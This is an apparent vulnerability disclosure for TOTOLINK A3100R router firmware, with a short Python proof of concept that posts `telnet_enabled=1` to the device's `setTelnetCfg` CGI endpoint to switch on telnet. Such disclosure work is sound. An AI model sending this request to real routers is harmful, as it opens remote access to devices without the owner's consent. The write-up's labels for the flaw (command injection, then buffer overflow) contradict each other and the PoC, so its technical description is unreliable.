## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/170/ids/36.html

## Affected version

A3100R V4.1.2cu.5050_B20200504

## Vulnerability details

In the A3100R V4.1.2cu.5050_B20200504 firmware has a command injection vulnerability in the `setTelnetCfg` function. The `v5` variable receives the `telnet_enabled` parameter from a POST request. However, since the user can control the input of `telnet_enabled`, the telnet service can cause a buffer overflow vulnerability.

![image-20240719233727873](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719233727873.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"telnet_enabled":"1", "topicurl":"setting/setTelnetCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719233900221](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719233900221.png)
